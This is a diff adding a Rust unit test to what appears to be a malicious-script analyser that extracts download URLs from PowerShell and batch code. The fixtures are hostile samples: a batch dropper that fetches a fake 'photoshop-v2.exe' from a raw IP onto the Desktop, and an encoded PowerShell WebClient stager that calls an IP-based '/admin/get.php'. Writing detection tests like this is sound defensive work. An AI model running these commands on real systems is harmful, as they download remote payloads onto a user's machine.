@@ -19609,6 +19609,37 @@ mod ps1_url_extraction_tests {
     }
 
     #[test]
+    fn powershell_path_getfilename_url_is_not_a_download() {
+        let script = br#"set "url=http://185.209.21.111/download/photoshop-v2.exe"
+for /f "delims=" %%A in ('powershell -Command "[System.IO.Path]::GetFileName('%url%')"') do set "filename=%%A"
+powershell -Command "Invoke-WebRequest -Uri '%url%' -OutFile '%USERPROFILE%\Desktop\%%A'"
+"#;
+        let report = analyze(script, &Config::default());
+        assert!(
+            !report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::Download { cmd, src, .. }
+                        if cmd.contains("GetFileName") && src == "http://185.209.21.111/download/photoshop-v2.exe"
+                )
+            }),
+            "Path.GetFileName URL was promoted as a download: {:?}",
+            report.traits
+        );
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::Download { cmd, src, .. }
+                        if cmd.contains("Invoke-WebRequest") && src == "http://185.209.21.111/download/photoshop-v2.exe"
+                )
+            }),
+            "real Invoke-WebRequest download was lost: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
     fn webclient_downloaddata_concatenated_variable_url_extracted() {
         let ps = r#"$ser=$('http://147.182.170.15:9090');$t='/admin/get.php';$wc=New-Object Net.WebClient;$wc.DownloadData($Ser+$T)"#;
         let script = format!("powershell -EncodedCommand {}\r\n", encode(ps));
